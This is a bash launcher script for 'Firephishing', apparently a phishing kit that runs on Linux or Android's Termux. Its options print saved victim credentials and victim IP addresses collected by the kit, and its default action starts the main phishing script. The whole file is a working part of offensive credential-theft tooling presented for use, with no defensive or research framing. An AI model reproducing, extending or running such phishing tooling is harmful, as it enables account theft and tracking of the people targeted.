#!/bin/bash

# Firephishing Launch Script

if [[ $(uname -o) == *'Android'* ]];then
	FIREPHISHING_ROOT="/data/data/com.termux/files/usr/opt/firephishing"
else
	export FIREPHISHING_ROOT="/opt/firephishing"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Firephishing type \`firephishing\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $FIREPHISHING_ROOT/auth/usernames.dat 2> /dev/null || {
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $FIREPHISHING_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $FIREPHISHING_ROOT
	bash ./firephishing.sh
fi
